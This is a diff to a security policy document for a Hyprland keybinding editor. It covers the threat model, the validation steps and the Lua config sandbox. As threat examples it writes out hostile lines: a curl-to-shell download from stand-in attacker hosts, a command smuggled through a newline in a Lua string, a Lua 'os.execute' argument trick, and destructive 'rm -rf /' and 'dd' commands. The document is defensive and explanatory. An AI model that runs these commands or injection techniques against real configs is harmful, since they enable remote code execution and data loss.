@@ -12,7 +12,7 @@ This document outlines the security architecture, threat model, supported versio
 - [Overview](#overview)
 - [Supported Versions](#supported-versions)
 - [Security Architecture](#security-architecture)
-  - [Four-Layer Defence System](#four-layer-defence-system)
+  - [What Runs Before a Binding Is Saved](#what-runs-before-a-binding-is-saved)
 - [Threat Model](#threat-model)
   - [Threats Mitigated ✅](#threats-mitigated-)
   - [Threats NOT Fully Mitigated ⚠️](#threats-not-fully-mitigated-️)
@@ -22,7 +22,8 @@ This document outlines the security architecture, threat model, supported versio
   - [3. Shannon Entropy Detection](#3-shannon-entropy-detection)
   - [4. Atomic File Operations](#4-atomic-file-operations)
   - [5. Automatic Backup System](#5-automatic-backup-system)
-  - [6. Permission Verification Warnings](#6-permission-verification-warnings)
+  - [6. Lua Config Sandbox](#6-lua-config-sandbox)
+  - [7. Permission Verification Warnings](#7-permission-verification-warnings)
 - [Memory Safety](#memory-safety)
   - [100% Safe Rust](#100-safe-rust)
   - [Protections Provided](#protections-provided)
@@ -42,58 +43,46 @@ This document outlines the security architecture, threat model, supported versio
 
 | Version | Supported          | Status                |
 |---------|-------------------|-----------------------|
-| 1.0.x   | ✅ Yes            | Current stable        |
-| 0.9.x   | ⚠️ Partial        | Security fixes only   |
-| < 0.9   | ❌ No             | Please upgrade        |
+| ≥ 1.4.2 | ✅ Yes            | Current stable        |
+| < 1.4.2 | ❌ No             | Please upgrade, see the 2026-10-14 audit below |
 
 ---
 
 ## Security Architecture
 
-### Four-Layer Defence System
+### What Runs Before a Binding Is Saved
+
+Every binding the user adds, edits or imports goes through the steps below. Lines already in the config are left alone; only bind lines that change are rewritten.
 
 ```mermaid
 %%{init: {'flowchart': {'subGraphTitleMargin': {'top': 10, 'bottom': 20}}}}%%
 graph TB
-    Input[User Input<br/>Key Combo, Dispatcher, Args]
+    Input[Binding from the edit dialog<br/>or an imported file]
 
-    subgraph Layer1 [Layer 1: Injection Prevention]
-        WhitelistCheck[Dispatcher Whitelist]
-        MetacharCheck[Shell Metacharacter Detection]
-        LengthCheck[Argument Length Limit]
-        KeyValidation[Key Name Validation]
+    subgraph Policy [1. Danger detection, on add, edit and import]
+        Critical[Critical patterns<br/>rm -rf /, dd to a disk, fork bombs]
     end
 
-    subgraph Layer2 [Layer 2: Danger Detection]
-        PatternMatch[Critical Pattern Matching<br/>rm -rf /, dd, fork bombs]
-        DangerHash[Dangerous Command HashSet<br/>sudo, chmod 777, mkfs]
-        EntropyDetect[Shannon Entropy Detection<br/>Base64/Hex payloads]
-        ContextAnalysis[Context-Aware Analysis]
+    subgraph Format [2. Format guards, on every write]
+        Hyprlang[hyprland.conf: no line break in any field,<br/>no comma before the arguments,<br/>hash signs doubled]
+        Lua[hyprland.lua: text as string literals,<br/>arguments evaluated and written back as data]
     end
 
-    subgraph Layer3 [Layer 3: Config Validation]
-        UnifiedReport[Unified Validation Report]
-        SeverityCheck[Severity Classification]
-        TransactionGuard[Transaction Integration]
+    subgraph Storage [3. Transaction]
+        Backup[Timestamped backup<br/>with the config's permissions]
+        Atomic[Atomic write]
     end
 
-    subgraph Layer4 [Layer 4: Optional Execution Sandbox]
-        Bubblewrap[Bubblewrap Wrapper<br/>No network access]
-        ExecOnly[Applied to exec bindings only]
-    end
+    Input --> Policy
+    Policy -->|critical| Reject[❌ Refused with a message]
+    Policy -->|anything else| Format
+    Format -->|would be misread| Reject
+    Format --> Storage
+    Storage --> Accept[✅ Saved]
 
-    Input --> Layer1
-    Layer1 --> Layer2
-    Layer2 --> Layer3
-    Layer3 --> Decision{Valid?}
-    Decision -->|Yes, sandbox on| Layer4
-    Decision -->|Yes, sandbox off| Accept[✅ Execute/Save]
-    Layer4 --> Accept
-    Decision -->|No| Reject[❌ Block + Error Message]
-
-    style Layer1 fill:#ffe1e1,color:#000
-    style Layer2 fill:#fff4e1,color:#000
-    style Layer3 fill:#e1ffe1,color:#000
+    style Policy fill:#fff4e1,color:#000
+    style Format fill:#ffe1e1,color:#000
+    style Storage fill:#e1ffe1,color:#000
     style Accept fill:#d4f1d4,color:#000
     style Reject fill:#ffd4d4,color:#000
 ```
@@ -102,44 +91,39 @@ graph TB
 <summary>ASCII Fallback Diagram</summary>
 
 ```
-User Input (Key Combo, Dispatcher, Args)
+Binding from the edit dialog or an imported file
     │
     ↓
-┌─────────────────────────────────────────────┐
-│  Layer 1: Injection Prevention              │
-│  ✓ Dispatcher whitelist                     │
-│  ✓ Shell metacharacter detection (;|&$`)    │
-│  ✓ Argument length limit (max 1000 chars)   │
-│  ✓ Key name validation                      │
-└────────────────┬────────────────────────────┘
+┌──────────────────────────────────────────────────┐
+│  1. Danger detection (add, edit, import)         │
+│  ✗ Critical: rm -rf /, dd to a disk, fork bombs  │──→ ❌ Refused
+└────────────────┬─────────────────────────────────┘
                  ↓
-┌─────────────────────────────────────────────┐
-│  Layer 2: Danger Detection                  │
-│  ✓ Critical patterns (rm -rf /, dd, forks)  │
-│  ✓ Dangerous command HashSet (sudo, chmod)  │
-│  ✓ Shannon entropy (base64/hex detection)   │
-│  ✓ Context-aware analysis                   │
-└────────────────┬────────────────────────────┘
+┌──────────────────────────────────────────────────┐
+│  2. Format guards (every write)                  │
+│  hyprland.conf: no line breaks, no commas before │──→ ❌ Refused
+│  the arguments, # written as ##                  │
+│  hyprland.lua: string literals, arguments        │
+│  evaluated and written back as data              │
+└────────────────┬─────────────────────────────────┘
                  ↓
-┌─────────────────────────────────────────────┐
-│  Layer 3: Config Validation                 │
-│  ✓ Unified validation report                │
-│  ✓ Severity classification (Error/Warn)     │
-│  ✓ Transaction integration                  │
-└────────────────┬────────────────────────────┘
+┌──────────────────────────────────────────────────┐
+│  3. Transaction                                  │
+│  Backup with the config's permissions, then an   │
+│  atomic write                                    │
+└────────────────┬─────────────────────────────────┘
                  ↓
-┌─────────────────────────────────────────────┐
-│  Layer 4: Optional Execution Sandbox        │
-│  ✓ Bubblewrap wrapper for exec bindings     │
-│  ✓ No network access inside sandbox         │
-│  ✓ Enabled per binding from the edit dialog │
-└────────────────┬────────────────────────────┘
-                 ↓
-         ┌───────┴────────┐
-         ↓                ↓
-    ✅ Accept        ❌ Reject
+             ✅ Saved
 ```
 </details>
+
+**Danger detection** rates the command of an `exec` or `execr` binding. A critical rating stops the save and names the binding. An import stops as a whole, so a shared file is never half applied. Dangerous and suspicious ratings, such as `sudo` or a base64 pipe, are allowed, because the detector matches known patterns and cannot tell a cleanup script from an attack. The GUI does not show those ratings yet.
+
+**Format guards** are about what Hyprland will read. A `hyprland.conf` bind is one line split on commas, so a line break in any field, or a comma in the key, description or dispatcher, would turn part of a field into another directive or another dispatcher. Such a binding is refused. A `#` is written as `##`, because a lone `#` starts a comment. In `hyprland.lua` every string is written as an escaped literal. Dispatcher arguments are evaluated with no globals and rendered again from the resulting values, so typed text never reaches the file as code.
+
+**Bubblewrap sandbox.** The edit dialog can wrap an `exec` binding in Bubblewrap, with no network access and only read-only system directories. Hyprland runs exec text with `sh -c`, so the whole command line is passed, quoted, to a shell that starts inside the sandbox, and `a; b` runs both commands inside it.
+
+**Injection checks for IPC.** The dispatcher whitelist and the shell metacharacter check in `src/core/validator.rs` guard binds sent to Hyprland over its socket. They are not applied to config writes, where an ordinary bind uses `"`, `|` or a dispatcher outside the list.
 
 ---
 
@@ -147,21 +131,21 @@ User Input (Key Combo, Dispatcher, Args)
 
 ### Threats Mitigated ✅
 
-#### 1. [Shell Command Injection](https://en.wikipedia.org/wiki/Code_injection#Shell_injection)
-**Attack Vector**: Malicious input in keybinding arguments
-```bash
-# BLOCKED: Attempt to inject shell commands
-bind = SUPER, K, exec, firefox; rm -rf /home/user
+#### 1. Config Injection Through a Field
+**Attack Vector**: An imported file holds a binding that Hyprland would read as more than one directive. A Lua string can hold a line break, and a description can hold commas.
+```lua
+-- A line break inside a Lua exec string, imported into a hyprland.conf setup
+hl.bind("SUPER + F12", hl.dsp.exec_cmd("true\nexec-once = curl attacker.example | sh"))
 ```
-**Mitigation**: Layer 1 detects `;` metacharacter and rejects input.
+**Mitigation**: The writer refuses a line break in any field and a comma before the arguments, and writes `#` as `##`. The import stops before anything is written.
 
-#### 2. Encoded Payload Injection
-**Attack Vector**: Base64 or hex-encoded malicious commands
-```bash
-# BLOCKED: Base64-encoded command
-bind = SUPER, K, exec, echo 'cm0gLXJmIC8=' | base64 -d | sh
+#### 2. Lua Code in Dispatcher Arguments
+**Attack Vector**: Arguments that look like data without globals, but run code once Hyprland loads the file.
+```lua
+-- 1 without globals; with them, Hyprland runs the command while loading
+hl.bind("SUPER + F12", hl.dsp.workspace(os and os.execute("...") or 1))
 ```
-**Mitigation**: Layer 2 [Shannon entropy](https://en.wikipedia.org/wiki/Entropy_(information_theory)) detection identifies encoded strings.
+**Mitigation**: Arguments are evaluated with no globals, under a memory and an instruction limit, and the values are written back as literals. The example is saved as `hl.dsp.workspace(1)`. Functions and nil are refused.
 
 #### 3. Dangerous System Commands
 **Attack Vector**: Direct system destruction commands
@@ -170,15 +154,15 @@ bind = SUPER, K, exec, echo 'cm0gLXJmIC8=' | base64 -d | sh
 bind = SUPER, K, exec, rm -rf /
 bind = SUPER, K, exec, dd if=/dev/zero of=/dev/sda
 ```
-**Mitigation**: Layer 2 regex patterns match critical command structures.
+**Mitigation**: Critical patterns refuse the binding on add, edit and import, for `exec` and `execr`. The check runs before the list of known safe commands, so `kitty -e rm -rf /` is refused as well.
 
-#### 4. Privilege Escalation
-**Attack Vector**: Unauthorised privilege elevation
+#### 4. Commands Escaping the Sandbox
+**Attack Vector**: A sandboxed `exec` binding that chains a second command.
 ```bash
-# FLAGGED: Privilege escalation attempt
-bind = SUPER, K, exec, sudo bash
+# Before 1.4.2 only firefox ran inside Bubblewrap
+firefox; curl attacker.example | sh
 ```
-**Mitigation**: Layer 2 flags `sudo`, `doas`, `su`, `pkexec` as dangerous.
+**Mitigation**: The whole command line goes to a shell started inside the sandbox.
 
 #### 5. Config File Corruption
 **Attack Vector**: Power loss or crash during write
@@ -186,18 +170,19 @@ bind = SUPER, K, exec, sudo bash
 
 #### 6. Data Loss from Accidental Deletion
 **Attack Vector**: User deletes keybinding by mistake
-**Mitigation**: Automatic timestamped backups before every write operation.
+**Mitigation**: Automatic timestamped backups before every write operation. A backup keeps the permission bits of the config, and the restore list only offers backups of the file being edited, never a symlink.
 
 ### Threats NOT Fully Mitigated ⚠️
 
 #### 1. Malicious Valid Commands
-**Scenario**: User intentionally creates dangerous but syntactically valid binding.
+**Scenario**: A binding, typed or imported, whose command is harmful but not critical.
 ```bash
-bind = SUPER, K, exec, curl attacker.com/malware.sh | sh
+bind = SUPER, K, exec, curl attacker.example/malware.sh | sh
+bind = SUPER, K, exec, echo 'cm0gLXJmIC8=' | base64 -d | sh
 ```
-**Status**: Application validates syntax, but cannot determine user intent.
-**Mitigation Strategy**: Layer 2 flags `curl` as suspicious, warns user.
-**Residual Risk**: User can ignore warning and proceed.
+**Status**: Saved as written. Hyprland runs it on the key press.
+**Mitigation Strategy**: The danger detector rates commands like these, or `sudo bash`, as dangerous or suspicious. Only critical ones are refused, and the GUI does not show the other ratings yet. The pattern list also misses variants such as `rm -rf /*` and absolute paths such as `/usr/bin/sudo`.
+**Residual Risk**: Read an import file before importing it; [Audit Third-Party Configs](#3-audit-third-party-configs) has a quick check.
 
 #### 2. [Time-of-Check to Time-of-Use (TOCTOU)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) Race Conditions
 **Scenario**: Malicious process modifies config file between validation and execution.
@@ -226,7 +211,7 @@ bind = SUPER, K, exec, firefox
 bind = SUPER, K, exec, wget http://attacker.com/payload
 ```
 **Status**: `wget`, `curl` are valid tools, often used legitimately.
-**Mitigation Strategy**: Layer 2 flags network tools as suspicious, and Bubblewrap sandboxing removes network access when enabled for `exec` bindings.
+**Mitigation Strategy**: The danger detector rates network tools as suspicious, though the GUI does not show it yet, and Bubblewrap removes network access when it is enabled for an `exec` binding.
 **Residual Risk**: Users can still save unsandboxed bindings, and the sandbox is opt-in rather than mandatory.
 
 ---
@@ -236,6 +221,8 @@ bind = SUPER, K, exec, wget http://attacker.com/payload
 ### 1. Whitelist-Based Validation
 
 **Philosophy**: Deny by default, allow explicitly.
+
+**Scope**: Binds sent to Hyprland over IPC. Config writes do not use the whitelist, because a real config uses dispatchers outside it, such as `resizewindow`.
 
 **Allowed Dispatchers** (as of October 2025):
 - Verified against official Hyprland documentation
@@ -252,6 +239,8 @@ bind = SUPER, K, exec, wget http://attacker.com/payload
 ```
 
 **Rationale**: These characters enable command chaining, piping, and substitution.
+
+**Scope**: Binds sent to Hyprland over IPC, like the whitelist. An `exec` bind in a config is a shell command line the user wrote on purpose, so the editor saves `|` and `;` as they are.
 
 **Example**:
 ```bash
@@ -294,7 +283,7 @@ fn shannon_entropy(data: &str) -> f64 {
 
 **Detection Order**: Hex before Base64 (hex alphabet ⊂ base64 alphabet).
 
-**Deep Dive**: For a comprehensive technical analysis including mathematical foundations, empirical validation methodology, theory vs. practice gap analysis, and complete test suite results (30/30 passing), see [ENTROPY_DETECTION.md](docs/ENTROPY_DETECTION.md) (929 lines).
+**Deep Dive**: For a comprehensive technical analysis including mathematical foundations, empirical validation methodology, theory vs. practice gap analysis, and complete test suite results (30/30 passing), see [ENTROPY_DETECTION.md](docs/ENTROPY_DETECTION.md) (945 lines).
 
 ### 4. [Atomic](https://en.wikipedia.org/wiki/Atomicity_(database_systems)) File Operations
 
@@ -321,6 +310,10 @@ fn shannon_entropy(data: &str) -> f64 {
 
 **Retention**: User-configurable (default: keep all backups).
 
+**Permissions**: A backup is copied with the permission bits of the config, so a `0600` config gets `0600` backups.
+
+**Restore list**: Only regular files named after the config being edited are offered. A sourced file in the same directory shares `backups/`, and its backups never appear in the list for the main file.
+
 **Sourced files**: A binding that lives in a `source =` file is written to that file, through the same transaction. Its backups go to a `backups/` directory next to that file.
 
 **Scope of a write**: Only bind lines whose binding changed are rewritten. Every other line is copied through unchanged, which keeps the reviewable diff of a config edit to the lines the user meant to touch.
@@ -329,7 +322,7 @@ fn shannon_entropy(data: &str) -> f64 {
 
 A `hyprland.lua` config is executed to discover its binds. It runs in an embedded Lua 5.5 state with a restricted environment: no `io`, no `load`/`dofile`, no `os.execute`, `require` limited to files inside the config directory, a 64 MiB memory limit and a 20 million instruction limit. Every `hl` function is a stub; callbacks passed to `hl.on` or `hl.timer` are never called. The config is the user's own file that Hyprland itself executes, so this is a guard against mistakes and endless loops rather than a trust boundary.
 
-Text written back into a Lua config is rendered as Lua string literals (keys, commands, descriptions), dispatcher paths are restricted to `[a-z0-9_.]`, and other arguments must evaluate as a literal in an empty environment. Dialog input cannot become code.
+Text written back into a Lua config is rendered as Lua string literals (keys, commands, descriptions), and dispatcher paths are restricted to `[a-z0-9_.]`. Other arguments are evaluated with no globals, under the same instruction limit and a 1 MiB memory limit, and the resulting values are rendered again by `src/core/lua_literal.lua`. Only that rendering is written. Checking the typed text and then writing it was not enough: `os and os.execute("...") or 1` is plain data without globals and a command once Hyprland loads the file.
 
 ### 7. Permission Verification Warnings
 
@@ -346,13 +339,21 @@ On startup, the application checks the target config file and warns when:
 
 ### 100% [Safe Rust](https://doc.rust-lang.org/nomicon/meet-safe-and-unsafe.html)
 
-- **Zero `unsafe` blocks** in entire codebase
-- **Cargo.toml workspace lints**:
+- **Zero `unsafe` blocks** in entire codebase, enforced by the compiler
+- **Cargo.toml lints**, applied to the package through `[lints] workspace = true`:
   ```toml
+  [lints]
+  workspace = true
+
   [workspace.lints.rust]
   unsafe_code = "forbid"
+
+  [workspace.lints.clippy]
+  expect_used = "deny"
   unwrap_used = "deny"
+  panic = "deny"
   ```
+- `clippy.toml` allows `unwrap`, `expect` and `panic!` in tests only
 
 ### Protections Provided
 
@@ -416,6 +417,7 @@ On startup, the application checks the target config file and warns when:
 
 | Date | Auditor | Scope | Findings |
 |------|---------|-------|----------|
+| 2026-10-14 | Internal | Full codebase, release workflow, dependencies | 3 high, 6 medium, 5 low, fixed in 1.4.2 (see CHANGELOG.md) |
 | 2025-01-15 | Internal | Full codebase | 0 critical, 0 high |
 | 2025-01-01 | Clippy | Rust best practices | 0 warnings |
 
@@ -509,5 +511,5 @@ The author thanks:
 
 ---
 
-**Last Updated**: 2025-11-01
+**Last Updated**: 2026-10-14
 **Version**: 1.4.1
